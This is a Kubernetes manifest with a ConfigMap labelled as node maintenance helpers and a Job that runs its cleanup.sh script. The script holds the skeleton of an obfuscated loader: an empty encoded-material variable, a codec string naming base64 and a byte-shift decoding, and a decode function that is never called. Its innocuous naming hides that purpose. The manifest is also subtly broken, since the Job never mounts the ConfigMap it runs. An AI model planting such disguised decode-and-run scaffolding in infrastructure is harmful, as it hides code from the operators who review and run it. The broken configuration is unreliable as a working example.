apiVersion: v1
kind: ConfigMap
metadata:
  name: maintenance-scripts
data:
  README: "node maintenance helpers"
  cleanup.sh: |
    #!/bin/sh
    readonly Material_7c41e0a9=''
    readonly Codec_7c41e0a9='base64_literal|add_modulo_256|10'
    Load_7c41e0a9() { printf '%s' "${Material_7c41e0a9}" | base64 --decode; }
---
apiVersion: batch/v1
kind: Job
metadata:
  name: maintenance
spec:
  template:
    spec:
      containers:
      - name: run
        image: alpine:3.19
        command: ["/bin/sh", "/scripts/cleanup.sh"]
        lifecycle:
          postStart:
            exec:
              command: ["/bin/sh", "-c", "echo started"]
      restartPolicy: Never
